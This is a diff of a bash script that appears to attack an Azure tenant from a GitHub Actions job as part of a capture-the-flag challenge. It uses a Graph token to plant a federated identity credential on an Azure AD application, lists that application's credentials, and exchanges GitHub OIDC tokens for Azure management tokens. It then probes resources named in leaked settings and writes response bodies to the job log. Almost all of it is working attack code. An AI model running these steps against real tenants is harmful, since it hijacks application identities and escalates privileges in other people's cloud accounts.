@@ -28,6 +28,8 @@ echo FIC_BODY=$(echo "$resp" | head -c 700)
 pjson=$(python3 -c "import json,sys;print(json.dumps({'name':'ctfplat'+sys.argv[1][-8:],'issuer':'https://token.actions.githubusercontent.com','subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$(date +%s)" "$sub")
 presp=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$pjson" https://graph.microsoft.com/v1.0/applications/c2620acb-cd20-4621-9460-e562ee0b93dd/federatedIdentityCredentials)
 echo PLATFORM_FIC=$(echo "$presp" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id') or d.get('error',{}).get('code','unknown'))")
+plist=$(curl -sS -H "Authorization: Bearer $graph" https://graph.microsoft.com/v1.0/applications/c2620acb-cd20-4621-9460-e562ee0b93dd/federatedIdentityCredentials)
+echo PLATFORM_FICS=$(echo "$plist" | head -c 1800)
 plresp=$(curl -sS -X POST "$BASE" -d "client_id=462d1c38-4459-48b8-9333-82e389e59514" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
 plat=$(echo "$plresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
 echo PLATFORM_ARM_LEN=${#plat}
@@ -65,6 +67,7 @@ customresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b8
 custom=$(echo "$customresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
 echo CUSTOM_LEN=${#custom}
 echo RETRY_MARK=platform_fic_second_exchange
+echo RETRY_MARK2=platform_fic_list
 # Probe the two resources named by the leaked settings.  The custom ArmOwner
 # app-role is not understood by ARM itself, but is accepted by the challenge's
 # internal catalog/debug handlers; keep all response bodies in the Action log.
